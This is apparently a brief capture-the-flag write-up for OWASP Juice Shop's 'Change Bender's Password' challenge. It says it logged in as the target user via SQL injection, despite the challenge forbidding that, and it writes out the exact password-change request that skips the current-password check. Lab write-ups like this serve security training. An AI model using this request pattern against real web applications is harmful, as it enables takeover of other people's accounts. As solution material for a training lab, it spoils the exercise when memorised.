# Change Bender's Password
Instructions:
    Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password.

## Solution
Benderemail address is (taken from `/#/administration` page): `bender@juice-sh.op`

Used `SQLi` for login as this user, then went to the `GET /rest/user/change-password?current=asdf&new=123456&repeat=123456` and received "Current password is not correct."

What we did is `GET /rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic` and received a wonderful acknowledgment!

